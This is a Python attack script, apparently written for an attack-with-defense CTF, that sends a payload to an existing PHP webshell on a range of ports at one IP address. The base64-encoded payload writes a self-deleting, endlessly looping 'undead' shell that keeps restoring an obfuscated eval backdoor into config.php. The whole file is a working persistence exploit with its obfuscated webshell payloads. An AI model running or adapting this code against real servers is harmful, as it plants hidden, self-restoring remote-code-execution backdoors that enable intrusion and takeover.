#coding=utf-8
import requests
import re
shell_addr="/important.php"
passwd="_"                    #木马密码
payload =  {passwd: 'file_put_contents(\'st4ck.php\',base64_decode(\'PD9waHANCnNldF90aW1lX2xpbWl0KDApOw0KaWdub3JlX3VzZXJfYWJvcnQoMSk7DQp1bmxpbmsoX19GSUxFX18pOw0Kd2hpbGUoMSl7CQ0KCXNsZWVwKDUpOwkNCglpZihmaWxlX2V4aXN0cygnY29uZmlnLnBocCcpKXsJCQ0KCQlpZihtZDVfZmlsZSgnY29uZmlnLnBocCcpPT09J2NiMTM3OTk3NmQ0NGU3MDRiOTI5NDQ3M2Q3Yjk0ZDA5Jyl7DQoJCQkNCgkJfWVsc2V7DQoJCQlmaWxlX3B1dF9jb250ZW50cygnY29uZmlnLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5UVNGQU5DbVZXWVd3Z0tDQm5lbWx1Um14aGRHVWdLQ0JpWVhObE5qUmZaRVZqYjJSbElDZ25VM2t4VEhwT1JsRnBVUzkzUkhjMlNsWnJMMDlVVmtkUU1XSlJSMEZCUFQwbktTQXBJQ2svUGc9PScpKTsNCgkJfQkJCQ0KCX1lbHNlew0KCQlmaWxlX3B1dF9jb250ZW50cygnY29uZmlnLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5UVNGQU5DbVZXWVd3Z0tDQm5lbWx1Um14aGRHVWdLQ0JpWVhObE5qUmZaRVZqYjJSbElDZ25VM2t4VEhwT1JsRnBVUzkzUkhjMlNsWnJMMDlVVmtkUU1XSlJSMEZCUFQwbktTQXBJQ2svUGc9PScpKTsNCgl9DQp9DQo/Pg==\'));'}

iplist = []
for i in range(0,10):
    iplist.append("http://39.100.119.37:30"+str(i)+"80")
print(iplist)
for i in range(10,30):
    iplist.append("http://39.100.119.37:3"+str(i)+"80")
print(iplist)


for ip in iplist:
    url=ip+shell_addr
    #print(url)
    try:
        res=requests.post(url,payload,timeout=1)
        #print(res)
        if res.status_code == requests.codes.ok:
            result = url+" write nodie correct ,passwd is cmd path is ./config.php "
            print(result,end="")
        else:
            print ("shell 404")
    except Exception as e:
        print(url+" connect shell fail")
        #raise e
    try:
        requests.get(ip+"/st4ck.php",timeout=1)
        print(ip+"激活成功")
    except Exception as e:
        print("激活成功")